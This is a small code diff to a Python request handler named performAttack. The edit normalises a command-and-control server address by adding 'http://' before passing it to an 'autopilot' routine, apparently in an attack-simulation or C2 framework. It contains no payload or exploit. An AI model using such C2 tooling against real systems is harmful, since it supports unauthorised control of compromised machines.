@@ -82,7 +82,10 @@ def performAttack():
     try:
         # retrieving and polishing C&C server and prepare config file
         if 'autopilot_start' in request.json:
-            allsafe.autopilot(request.json['cc_server_auto'], {}, int(request.json['contact_time']), override=False)
+            server = request.json['cc_server_auto']
+            if "http://" not in server:
+                server = "http://" + server
+            allsafe.autopilot(server, {}, int(request.json['contact_time']), override=False)
             return "OK", 200
 
         # prepare configuration
